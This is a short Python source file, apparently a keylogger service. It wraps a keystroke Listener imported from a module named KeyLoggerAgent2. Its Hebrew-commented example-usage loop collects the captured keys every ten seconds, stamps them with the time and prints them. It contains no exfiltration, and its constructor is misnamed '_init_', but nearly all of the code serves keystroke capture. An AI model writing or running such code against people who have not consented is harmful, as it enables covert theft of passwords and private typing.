from abc import ABC, abstractmethod
from typing import List
import time
from KeyLoggerAgent2 import Listener, logged_keys
import datetime


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class KeyLoggerService(IKeyLogger):
    def _init_(self):
        self._active = False

    def start_logging(self):
        Listener.start()
        self._active = True

    def stop_logging(self):
        Listener.stop()
        self._active = False

    def get_logged_keys(self) -> List[str]:

        t=logged_keys.copy()
        logged_keys.clear()
        return t

# שימוש לדוגמה

keylogger = KeyLoggerService()
keylogger.start_logging()




k={}
while Listener.is_alive():
    time.sleep(10)
    i=datetime.datetime.now()

    k[i] =("".join(keylogger.get_logged_keys()))
    print(k)

print("נאספו מקשים:")
print("".join(keylogger.get_logged_keys()))
